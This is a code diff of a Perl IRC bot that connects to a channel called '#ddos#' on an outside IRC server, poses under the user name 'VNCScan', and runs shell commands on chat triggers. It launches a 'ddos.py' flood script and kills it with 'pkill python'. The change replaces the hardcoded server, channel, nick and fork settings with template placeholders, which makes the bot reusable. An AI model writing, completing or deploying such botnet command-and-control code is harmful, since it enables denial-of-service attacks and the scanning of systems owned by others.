@@ -5,18 +5,18 @@
  use feature 'say';
  use Fcntl qw(:flock SEEK_END);
  $|=1;
- my @VNC_PORTS = qw/'5900 5901'/;
+ #defineportshere
   use Mojo::IOLoop;
- my $forktimeout = 10;
- my $maxforks = 500;
- my $noticechan = '@#ddos#';
- my $channel = '#ddos#';
+ #definetimeouthere
+ #defineforkshere
+ #definenoticechanhere
+ #definechanhere
   my $irc = Mojo::IRC->new(
- nick => 'ddos'.int(rand(99999)),
+ #definenickhere
   user => 'VNCScan',
- server => 'irc.chknet.cc:6697',
+ #defineserverhere
   );
- $irc->tls({insecure => 1});
+ #definesslhere
  $irc->on(irc_rpl_welcome => sub {
   my($irc, $err) = @_;
   warn 'Joined IRC server.';
@@ -33,7 +33,7 @@
    warn 'Received PING request, sending PONG.';
    $irc->write(notice => $noticechan => "pong");
    }if ($msg =~ /@.ddos/) {
-   	system 'python ddos.py ' . "@ARGV"; 
+   	system 'xterm -e python ddos.py ' . "@ARGV"; 
 }
 if ($msg =~ /@.d.kill/) {
    	system 'pkill python'; 
